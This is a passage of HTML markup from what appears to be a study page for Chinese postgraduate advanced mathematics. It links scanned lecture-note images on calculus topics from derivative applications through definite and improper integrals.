src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/7.%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC/7%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC_5.jpg" alt="测试">    </p>  </li>  <li>    <p>函数图像描绘<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/8.%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98/8%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/8.%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98/8%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/8.%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98/8%E5%87%BD%E6%95%B0%E5%9B%BE%E5%83%8F%E6%8F%8F%E7%BB%98_3.jpg" alt="测试">    </p>  </li>  <li>    <p>弧微分与曲率</p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/9.%E5%BC%A7%E5%BE%AE%E5%88%86%E4%B8%8E%E6%9B%B2%E7%8E%87/9%E5%BC%A7%E5%BE%AE%E5%88%86%E4%B8%8E%E6%9B%B2%E7%8E%87_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/9.%E5%BC%A7%E5%BE%AE%E5%88%86%E4%B8%8E%E6%9B%B2%E7%8E%87/9%E5%BC%A7%E5%BE%AE%E5%88%86%E4%B8%8E%E6%9B%B2%E7%8E%87_2.jpg" alt="测试"></p><h3 id="第四章-不定积分"><a href="#第四章-不定积分" class="headerlink" title="第四章 不定积分"></a>第四章  不定积分</h3><ol>  <li>    <p>不定积分的概念与性质<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/1.%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/1%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/1.%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/1%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/1.%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/1%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_3.jpg" alt="测试">    </p>  </li>  <li>    <p>换元积分法(一)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/2.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%B8%80)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/2.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%B8%80)_2.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/2.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/2%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%B8%80)_3.jpg" alt="测试">_    </p>  </li>  <li>    <p>换元积分法(二)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%BA%8C)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%BA%8C)_2.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%BA%8C)_3.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/3%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95(%E4%BA%8C)_4.jpg" alt="测试">_    </p>  </li>  <li>    <p>分部积分法<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_3.jpg" alt="测试">    </p>  </li></ol><h3 id="第五章、定积分"><a href="#第五章、定积分" class="headerlink" title="第五章、定积分"></a>第五章、定积分</h3><ol>  <li>    <p>定积分的概念与性质<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/1.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8%EF%BC%88%E4%B8%80%EF%BC%89/1%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/1.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8%EF%BC%88%E4%B8%80%EF%BC%89/1%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_2.jpg" alt="测试">    </p>  </li>  <li>    <p>定积分的概念与性质(二)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/2.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8(%E4%BA%8C)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/2.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8(%E4%BA%8C)_2.jpg" alt="测试">_    </p>  </li>  <li>    <p>积分基本公式<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F/3%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F/3%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/3.%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F/3%E7%A7%AF%E5%88%86%E5%9F%BA%E6%9C%AC%E5%85%AC%E5%BC%8F_3.jpg" alt="测试">    </p>  </li>  <li>    <p>定积分的换元积分法与分部积分法<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_4.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/4.%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95/4%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%E4%B8%8E%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95_5.jpg" alt="测试">    </p>  </li>  <li>    <p>反常积分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/5.%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/5%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/5.%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/5%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/5.%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/5%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%AE%9A%E7%A7%AF%E5%88%86/5.%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/5%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86_4.jpg" alt="测试"><br><img 